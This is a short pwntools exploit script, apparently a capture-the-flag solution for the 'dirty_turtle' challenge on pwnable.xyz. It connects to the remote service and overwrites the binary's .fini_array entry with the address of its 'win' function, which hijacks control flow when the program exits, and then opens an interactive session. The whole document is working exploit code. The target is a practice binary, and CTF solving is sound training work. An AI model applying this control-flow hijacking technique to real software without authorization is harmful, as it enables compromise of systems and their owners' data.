from pwn import *
#p = process("./dirty_turtle")
p = remote("svc.pwnable.xyz", 30033)
elf = ELF("./dirty_turtle")
win = elf.symbols['win']
fini_array = 0x600bc0
p.sendline(str(fini_array))
p.sendline(str(win))

p.interactive()
